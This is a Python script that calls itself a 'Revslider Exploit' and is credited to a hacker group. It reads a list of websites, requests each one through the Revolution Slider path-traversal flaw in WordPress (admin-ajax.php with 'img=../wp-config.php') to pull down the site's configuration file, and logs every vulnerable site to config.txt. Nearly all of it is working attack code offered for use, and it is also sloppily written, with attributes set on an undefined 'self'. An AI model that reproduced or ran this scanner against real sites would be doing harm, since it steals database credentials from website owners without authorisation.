import urllib2
import requests
import os, re, sys, glob, time, random, threading



def print_logo():
    clear = "\x1b[0m"
    colors = [34 , 37]

    x = '''
	==================================
	|      TA Revslider Exploit      |
	|       SAUDI CYBERS [SC]        |
	|--------------------------------|
	|   CoDeD By TA Hacker (@391F)   |
	|--------------------------------|
	'''
    for N , line in enumerate ( x.split ( "\n" ) ):
        sys.stdout.write ( "\x1b[1;%dm%s%s\n" % (random.choice ( colors ) , line , clear) )
        time.sleep ( 0.03 )

def self():
    self.r = '\033[31m'
    self.g = '\033[32m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    self.m = '\033[35m'
    self.c = '\033[36m'
    self.w = '\033[37m'

def pAthwp():
    self.c = '\033[36m'
    self.m = '\033[35m'
    self.g = '\033[32m'
    reQ = raw_input (self.c+ "Enter Your List Websites ==> " )
    reqlist = open ( reQ ).read ( ).splitlines ( )
    for reqlist in reqlist:
        try:
            self.r = '\033[31m'
            self.g = '\033[32m'
            urllib2.Request ( reqlist )
            response = urllib2.urlopen ( reqlist )
            t = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            r = requests.get ( reqlist + t )
            html = response.read ( )
            print ( self.m+"[+] url {}".format ( reqlist ) )
            if r.content.startswith ( b'<?php' ):
                print ( self.g+'Config ==> {}'.format(reqlist) )
                with open ( 'config.txt' , 'a' ) as config:
                    config.write ( reqlist + t + '\n' )
            else:
                print (self.r+ "[-] {}".format(reqlist) )
        except:
            pass


if __name__ == '__main__':
    print_logo()
    pAthwp()
    self()
